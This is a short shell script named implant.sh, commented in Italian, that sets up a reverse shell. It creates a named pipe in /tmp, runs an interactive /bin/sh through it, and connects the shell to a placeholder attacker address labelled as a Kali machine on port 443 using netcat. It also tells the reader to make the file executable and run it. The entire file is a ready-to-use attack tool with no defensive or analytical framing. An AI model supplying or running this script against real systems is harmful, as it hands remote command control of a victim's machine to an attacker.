#!/bin/sh
# Script per una reverse shell stabile usando netcat e una named pipe (FIFO)
# comando per rendere implant.sh eseguibile: 
#  chmod +x implant.sh
# Poi
# ./implant.sh

KALI_IP="<IL_TUO_IP_KALI>"
KALI_PORT="443" # o 8080

echo "Connecting back to ${KALI_IP}:${KALI_PORT}..."

# Rimuove la pipe se esiste già, ignorando l'errore se non esiste
rm /tmp/f 2>/dev/null

# Crea una named pipe (FIFO)
mkfifo /tmp/f

# Legge i dati dalla pipe, li esegue in una shell interattiva (-i),
# e reindirizza sia stdout che stderr (2>&1) alla connessione di rete con netcat.
# L'output di netcat (i comandi ricevuti dall'attacker) viene scritto nella pipe.
cat /tmp/f | /bin/sh -i 2>&1 | nc ${KALI_IP} ${KALI_PORT} > /tmp/f
